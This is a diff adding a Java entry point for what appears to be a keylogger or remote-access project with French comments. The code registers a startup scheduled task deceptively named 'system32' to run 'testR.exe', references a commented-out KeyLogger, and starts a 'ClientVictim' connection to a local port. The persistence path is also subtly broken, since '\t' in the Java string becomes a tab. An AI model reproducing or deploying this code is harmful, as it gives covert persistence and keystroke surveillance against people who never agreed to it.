@@ -1,0 +1,39 @@
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
+
+public class Main {
+
+	
+	// LOG fichier
+	// appels systèmes
+	// gestionnaire de taches
+	
+	
+	public static void main(String[] args) {
+		// TODO Auto-generated method stub
+
+		//KeyLogger keylogger = new KeyLogger();
+		
+		Process p;
+		try {
+			p = Runtime.getRuntime().exec("cmd /c echo %CD%");
+			BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream(), "cp850"));
+			String path = b.readLine();
+			System.out.println(path);
+			path += "\testR.exe";
+			Runtime.getRuntime().exec("cmd /c schtasks /create /sc onstart /tn \"system32\" /tr "+path);
+
+		} catch (Exception e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+		
+		ClientVictim c = new ClientVictim( "127.0.0.1", 2005);
+		//keylogger.closeBuffer();
+		c.start();
+		
+	}
+
+}
